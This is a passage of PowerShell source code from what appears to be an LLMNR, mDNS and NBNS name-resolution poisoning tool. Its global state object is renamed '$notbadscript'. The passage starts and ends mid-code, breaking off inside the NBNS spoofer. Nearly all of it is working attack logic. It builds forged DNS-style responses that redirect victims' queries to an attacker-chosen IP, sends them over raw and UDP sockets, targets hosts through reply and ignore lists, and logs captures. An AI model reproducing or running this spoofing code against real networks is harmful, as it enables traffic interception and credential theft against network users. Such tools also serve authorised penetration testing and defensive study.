                                        $mDNS_response_message = "- $mDNS_query_string is on ignore list"
                                    }
                                    elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                                    {
                                        $mDNS_response_message = "- $source_IP is not on reply list"
                                    }
                                    elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                    {
                                        $mDNS_response_message = "- $source_IP is on ignore list"
                                    }
                                    else
                                    {
                                        $mDNS_response_message = "- not spoofed due to previous capture"
                                    }

                                }

                            }

                            $notbadscript.console_queue.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")

                            if($notbadscript.file_output)
                            {
                                $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                            }

                            if($notbadscript.log_output)
                            {
                                $notbadscript.log.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                            }

                        }
                        elseif([System.BitConverter]::ToString($payload_bytes) -like '*-05-6C-6F-63-61-6C-00-00-01-00-01-*')
                        {
                            $UDP_length[0] += 4
                            $mDNS_query_payload_bytes = $payload_bytes[12..($payload_bytes[12] + 12)]
                            $mDNS_query_string = DataToString 1 $mDNS_query_payload_bytes[0] $mDNS_query_payload_bytes
                            $mDNS_query_string_full = $mDNS_query_string + ".local"

                            $mDNS_response_data = $mDNS_query_payload_bytes +
                                                    0x05,0x6c,0x6f,0x63,0x61,0x6c,0x00 +
                                                    0x00,0x01,0x80,0x01 +
                                                    $mDNS_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()


                            $mDNS_response_packet = 0x14,0xe9 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $mDNS_response_data

                            if($mDNS -eq 'Y')
                            {

                                if((!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (
                                !$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
                                $notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($mDNSTypes -contains 'QM'))
                                {
                                    $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                    $send_socket.SendBufferSize = 1024
                                    $destination_point = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                                    $send_socket.SendTo($mDNS_response_packet,$destination_point)
                                    $send_socket.Close()
                                    $mDNS_response_message = "- response sent"
                                }
                                else
                                {

                                    if($mDNSTypes -notcontains 'QM')
                                    {
                                        $mDNS_response_message = "- disabled mDNS type"
                                    }
                                    elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $mDNS_query_string)
                                    {
                                        $mDNS_response_message = "- $mDNS_query_string is not on reply list"
                                    }
                                    elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $mDNS_query_string)
                                    {
                                        $mDNS_response_message = "- $mDNS_query_string is on ignore list"
                                    }
                                    elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                                    {
                                        $mDNS_response_message = "- $source_IP is not on reply list"
                                    }
                                    elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                    {
                                        $mDNS_response_message = "- $source_IP is on ignore list"
                                    }
                                    else
                                    {
                                        $mDNS_response_message = "- not spoofed due to previous capture"
                                    }

                                }

                            }

                            $notbadscript.console_queue.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")

                            if($notbadscript.file_output)
                            {
                                $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                            }

                            if($notbadscript.log_output)
                            {
                                $notbadscript.log.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                            }

                        }

                    }

                    5355 # LLMNR
                    {

                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length - 3)]) -ne '00-1c') # ignore AAAA for now
                        {
                            $UDP_length[0] += $payload_bytes.Length - 2
                            $LLMNR_response_data = $payload_bytes[12..$payload_bytes.Length]

                            $LLMNR_response_data += $LLMNR_response_data +
                                                    $LLMNR_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

                            $LLMNR_response_packet = 0x14,0xeb +
                                                        $source_port[1,0] +
                                                        $UDP_length[1,0] +
                                                        0x00,0x00 +
                                                        $payload_bytes[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        $LLMNR_response_data

                            $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                            $LLMNR_query = $LLMNR_query -replace "-00",""

                            if($LLMNR_query.Length -eq 2)
                            {
                                $LLMNR_query = [Char][System.Convert]::ToInt16($LLMNR_query,16)
                                $LLMNR_query_string = New-Object System.String($LLMNR_query)
                            }
                            else
                            {
                                $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $LLMNR_query_string = New-Object System.String($LLMNR_query,0,$LLMNR_query.Length)
                            }

                            $LLMNR_request_ignore = $false

                            if($LLMNR -eq 'Y')
                            {

                                if($SpooferLearning -eq 'Y' -and $notbadscript.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
                                {

                                    if(($LLMNR_learning_log.Exists({param($s) $s -like "20* $LLMNR_query_string"})))
                                    {
                                        $LLMNR_learning_queue_time = [DateTime]$LLMNR_learning_log.Find({param($s) $s -like "20* $LLMNR_query_string"}).SubString(0,19)

                                        if((Get-Date) -ge $LLMNR_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                        {
                                            $LLMNR_learning_log.RemoveAt($LLMNR_learning_log.FindIndex({param($s) $s -like "20* $LLMNR_query_string"}))
                                            $LLMNR_learning_send = $true
                                        }
                                        else
                                        {
                                            $LLMNR_learning_send = $false
                                        }

                                    }
                                    else
                                    {
                                        $LLMNR_learning_send = $true
                                    }

                                    if($LLMNR_learning_send)
                                    {
                                        $LLMNR_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                                        $LLMNR_transaction_ID_bytes = $LLMNR_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                        $LLMNR_transaction_ID = $LLMNR_transaction_ID -replace " ","-"
                                        $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient
                                        $LLMNR_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]

                                        $LLMNR_request_packet = $LLMNR_transaction_ID_bytes +
                                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                                ($LLMNR_hostname_bytes.Length - 1) +
                                                                $LLMNR_hostname_bytes +
                                                                0x00,0x01,0x00,0x01

                                        $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
                                        $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)
                                        $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)
                                        $LLMNR_UDP_client.Close()
                                        $LLMNR_learning_log.Add("$(Get-Date -format 's') $LLMNR_transaction_ID $LLMNR_query_string")
                                        $notbadscript.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252")

                                        if($notbadscript.file_output)
                                        {
                                            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252")
                                        }

                                        if($notbadscript.log_output)
                                        {
                                            $notbadscript.log.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252")
                                        }

                                    }

                                }

                                if(($notbadscript.valid_host_list -notcontains $LLMNR_query_string -or $SpooferHostsReply -contains $LLMNR_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
                                !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
                                !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP.IPAddressToString) -and (
                                $SpooferLearning -eq 'N' -or ($SpooferLearning -eq 'Y' -and !$SpooferLearningDelay) -or ($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -ge $spoofer_learning_delay)))
                                {

                                    if($SpooferLearning -eq 'N' -or !$LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                        $LLMNR_send_socket.SendBufferSize = 1024
                                        $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)
                                        $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point)
                                        $LLMNR_send_socket.Close()
                                        $LLMNR_response_message = "- response sent"
                                    }
                                    else
                                    {
                                        $LLMNR_request_ignore = $true
                                    }
                                }
                                else
                                {

                                    if($SpooferHostsReply -and $SpooferHostsReply -notcontains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string is not on reply list"
                                    }
                                    elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string is on ignore list"
                                    }
                                    elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                                    {
                                        $LLMNR_response_message = "- $source_IP is not on reply list"
                                    }
                                    elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                    {
                                        $LLMNR_response_message = "- $source_IP is on ignore list"
                                    }
                                    elseif($notbadscript.valid_host_list -contains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string is a valid host"
                                    }
                                    elseif($notbadscript.IP_capture_list -contains $source_IP.IPAddressToString)
                                    {
                                        $LLMNR_response_message = "- previous capture from $source_IP"
                                    }
                                    elseif($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
                                    {
                                        $LLMNR_response_message = "- " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
                                    }
                                    else
                                    {
                                        $LLMNR_response_message = "- something went wrong"
                                    }

                                }

                            }

                            if(!$LLMNR_request_ignore)
                            {
                                $notbadscript.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")

                                if($notbadscript.file_output)
                                {
                                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                                }

                                if($notbadscript.log_output)
                                {
                                    $notbadscript.log.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                                }

                            }

                        }

                    }

                }

                switch($endpoint_source_port)
                {

                    5355 # LLMNR Response
                    {

                        if($SpooferLearning -eq 'Y' -and $LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                        {
                            $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes[12] + 13)])
                            $LLMNR_query = $LLMNR_query -replace "-00",""

                            if($LLMNR_query.Length -eq 2)
                            {
                                $LLMNR_query = [Char][System.Convert]::ToInt16($LLMNR_query,16)
                                $LLMNR_query_string = New-Object System.String($LLMNR_query)
                            }
                            else
                            {
                                $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $LLMNR_query_string = New-Object System.String($LLMNR_query,0,$LLMNR_query.Length)
                            }

                            [Byte[]]$LLMNR_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                            $LLMNR_response_IP = [System.Net.IPAddress]$LLMNR_response_IP_bytes
                            $LLMNR_response_IP = $LLMNR_response_IP.IPAddressToString

                            if($notbadscript.valid_host_list -notcontains $LLMNR_query_string)
                            {
                                $notbadscript.valid_host_list.Add($LLMNR_query_string)
                                $notbadscript.console_queue.Add("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list")

                                if($notbadscript.file_output)
                                {
                                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list")
                                }

                                if($notbadscript.log_output)
                                {
                                    $notbadscript.log.Add("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list")
                                }

                            }

                        }

                    }

                }

            }

        }

    }

    $binary_reader.Close()
    $memory_stream.Dispose()
    $memory_stream.Close()
}

# Unprivileged LLMNR Spoofer ScriptBlock
$LLMNR_spoofer_scriptblock =
{
    param ($Inspect,$LLMNR_response_message,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$LLMNRTTL)

    $LLMNR_running = $true
    $LLMNR_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5355)

    try
    {
        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
    }
    catch
    {
        $notbadscript.console_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")
        $LLMNR_running = $false

        if($notbadscript.file_output)
        {
            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")
        }

        if($notbadscript.log_output)
        {
            $notbadscript.log.Add("$(Get-Date -format 's') - Error starting LLMNR spoofer")
        }

    }

    $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
    $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
    $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse($LLMNR_TTL_bytes)

    while($notbadscript.running -and $LLMNR_running)
    {

        try
        {
            $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint)
        }
        catch
        {
            $LLMNR_UDP_client.Close()
            $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
            $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
            $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
            $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
        }

        if($LLMNR_request_data -and [System.BitConverter]::ToString($LLMNR_request_data[($LLMNR_request_data.Length - 4)..($LLMNR_request_data.Length - 3)]) -ne '00-1c') # ignore AAAA for now
        {

            $LLMNR_response_packet = $LLMNR_request_data[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +
                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +
                                     $LLMNR_TTL_bytes +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

            $LLMNR_query_string = [Text.Encoding]::UTF8.GetString($LLMNR_request_data[13..($LLMNR_request_data[12] + 12)])
            $source_IP = $LLMNR_listener_endpoint.Address.IPAddressToString

            if(!$Inspect -and ($LLMNR_request_data -and $LLMNR_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
            $notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP))
            {
                $LLMNR_destination_endpoint = New-Object Net.IPEndpoint($LLMNR_listener_endpoint.Address,$LLMNR_listener_endpoint.Port)
                $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)
                $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
                $LLMNR_UDP_client.Close()
                $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
                $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
                $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
                $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
                $LLMNR_response_message = "- response sent"
            }
            else
            {

                if($Inspect)
                {
                    $LLMNR_response_message = "- inspect only"
                }
                elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $LLMNR_query_string)
                {
                    $LLMNR_response_message = "- $LLMNR_query_string is not on reply list"
                }
                elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $LLMNR_query_string)
                {
                    $LLMNR_response_message = "- $LLMNR_query_string is on ignore list"
                }
                elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                {
                    $LLMNR_response_message = "- $source_IP is not on reply list"
                }
                elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                {
                    $LLMNR_response_message = "- $source_IP is on ignore list"
                }
                elseif($notbadscript.IP_capture_list -contains $source_IP)
                {
                    $LLMNR_response_message = "- previous capture from $source_IP"
                }
                else
                {
                    $LLMNR_response_message = "- something went wrong"
                }

            }

            if($LLMNR_request_data)
            {
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                }

            }

            $LLMNR_request_data = ""
        }

    }

    $LLMNR_UDP_client.Close()
 }

# Unprivileged mDNS Spoofer ScriptBlock
$mDNS_spoofer_scriptblock =
{
    param ($Inspect,$mDNS_response_message,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)

    $mDNS_running = $true
    $mDNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5353)

    try
    {
        $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient 5353
    }
    catch
    {
        $notbadscript.console_queue.Add("$(Get-Date -format 's') - Error starting mDNS spoofer")
        $mDNS_running = $false

        if($notbadscript.file_output)
        {
            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Error starting mDNS spoofer")
        }

        if($notbadscript.log_output)
        {
            $notbadscript.log.Add("$(Get-Date -format 's') - Error starting mDNS spoofer")
        }

    }

    $mDNS_multicast_group = [IPAddress]"224.0.0.251"
    $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
    $mDNS_UDP_client.Client.ReceiveTimeout = 5000
    $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)
    [Array]::Reverse($mDNS_TTL_bytes)

    while($notbadscript.running -and $mDNS_running)
    {

        try
        {
            $mDNS_request_data = $mDNS_UDP_client.Receive([Ref]$mDNS_listener_endpoint)
        }
        catch
        {
            $mDNS_UDP_client.Close()
            $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353
            $mDNS_multicast_group = [IPAddress]"224.0.0.251"
            $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
            $mDNS_UDP_client.Client.ReceiveTimeout = 5000
        }

        if([System.BitConverter]::ToString($mDNS_request_data) -like '*-00-01-80-01')
        {
            $mDNS_response_packet = $mDNS_request_data[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $mDNS_request_data[12..($mDNS_request_data.Length - 5)] +
                                    0x00,0x01,0x00,0x01 +
                                    $mDNS_TTL_bytes +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

            $mDNS_query_string = DataToString 13 $mDNS_request_data[12] $mDNS_request_data
            $mDNS_query_string_full = $mDNS_query_string + ".local"
            $source_IP = $mDNS_listener_endpoint.Address.IPAddressToString

            if(!$Inspect -and ($mDNS_request_data -and $mDNS_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (
            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
            $mDNSTypes -contains 'QU') -and ($notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP))
            {
                $mDNS_destination_endpoint = New-Object Net.IPEndpoint($mDNS_listener_endpoint.Address,$mDNS_listener_endpoint.Port)
                $mDNS_UDP_client.Connect($mDNS_destination_endpoint)
                $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)
                $mDNS_UDP_client.Close()
                $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353
                $mDNS_multicast_group = [IPAddress]"224.0.0.251"
                $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
                $mDNS_UDP_client.Client.ReceiveTimeout = 5000
                $mDNS_response_message = "- response sent"
            }
            else
            {

                if($Inspect)
                {
                    $mDNS_response_message = "- inspect only"
                }
                elseif($mDNSTypes -notcontains 'QU')
                {
                    $mDNS_response_message = "- disabled mDNS type"
                }
                elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $mDNS_query_string)
                {
                    $mDNS_response_message = "- $mDNS_query_string is not on reply list"
                }
                elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $mDNS_query_string)
                {
                    $mDNS_response_message = "- $mDNS_query_string is on ignore list"
                }
                elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                {
                    $mDNS_response_message = "- $source_IP is not on reply list"
                }
                elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                {
                    $mDNS_response_message = "- $source_IP is on ignore list"
                }
                elseif($notbadscript.IP_capture_list -contains $source_IP)
                {
                    $mDNS_response_message = "- previous capture from $source_IP"
                }
                else
                {
                    $mDNS_response_message = "- something went wrong"
                }

            }

            if($mDNS_request_data)
            {
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                }

            }

            $mDNS_request_data = ""
        }
        elseif([System.BitConverter]::ToString($mDNS_request_data) -like '*-05-6C-6F-63-61-6C-00-00-01-00-01-*')
        {
            $mDNS_response_packet = $mDNS_request_data[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $mDNS_request_data[12..($mDNS_request_data[12] + 12)] +
                                    0x05,0x6c,0x6f,0x63,0x61,0x6c,0x00 +
                                    0x00,0x01,0x00,0x01 +
                                    $mDNS_TTL_bytes +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

            $mDNS_query_string = DataToString 13 $mDNS_request_data[12] $mDNS_request_data
            $mDNS_query_string_full = $mDNS_query_string + ".local"
            $source_IP = $mDNS_listener_endpoint.Address.IPAddressToString

            if(!$Inspect -and ($mDNS_request_data -and $mDNS_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (
            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
            $mDNSTypes -contains 'QM') -and ($notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP))
            {
                $mDNS_destination_endpoint = New-Object Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                $mDNS_UDP_client.Connect($mDNS_destination_endpoint)
                $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)
                $mDNS_UDP_client.Close()
                $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353
                $mDNS_multicast_group = [IPAddress]"224.0.0.251"
                $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
                $mDNS_UDP_client.Client.ReceiveTimeout = 5000
                $mDNS_response_message = "- response sent"
            }
            else
            {

                if($Inspect)
                {
                    $mDNS_response_message = "- inspect only"
                }
                elseif($mDNSTypes -notcontains 'QM')
                {
                    $mDNS_response_message = "- disabled mDNS type"
                }
                elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $mDNS_query_string)
                {
                    $mDNS_response_message = "- $mDNS_query_string is not on reply list"
                }
                elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $mDNS_query_string)
                {
                    $mDNS_response_message = "- $mDNS_query_string is on ignore list"
                }
                elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                {
                    $mDNS_response_message = "- $source_IP is not on reply list"
                }
                elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                {
                    $mDNS_response_message = "- $source_IP is on ignore list"
                }
                elseif($notbadscript.IP_capture_list -contains $source_IP)
                {
                    $mDNS_response_message = "- previous capture from $source_IP"
                }
                else
                {
                    $mDNS_response_message = "- something went wrong"
                }

            }

            if($mDNS_request_data)
            {
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
                }

            }

            $mDNS_request_data = ""
        }

    }

    $mDNS_UDP_client.Close()
 }

# Unprivileged NBNS Spoofer ScriptBlock
$NBNS_spoofer_scriptblock =
{
    param ($Inspect,$NBNS_response_message,$SpooferIP,$NBNSTypes,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$NBNSTTL)

    $NBNS_running = $true
    $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)

    try
    {
        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
    }
    catch
    {
        $notbadscript.console_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")
        $NBNS_running = $false

        if($notbadscript.file_output)
        {
            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")
        }

        if($notbadscript.log_output)
        {
            $notbadscript.log.Add("$(Get-Date -format 's') - Error starting NBNS spoofer")
        }

    }

    $NBNS_UDP_client.Client.ReceiveTimeout = 5000
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)

    while($notbadscript.running -and $NBNS_running)
    {

        try
        {
            $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint)
        }
        catch
        {
            $NBNS_UDP_client.Close()
            $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
            $NBNS_UDP_client.Client.ReceiveTimeout = 5000
        }

        $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)

        if($NBNS_request_data -and [System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
        {
            $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
            [Array]::Reverse($NBNS_TTL_bytes)

            $NBNS_response_packet = $NBNS_request_data[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    $NBNS_request_data[13..$NBNS_request_data.Length] +
                                    $NBNS_TTL_bytes +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
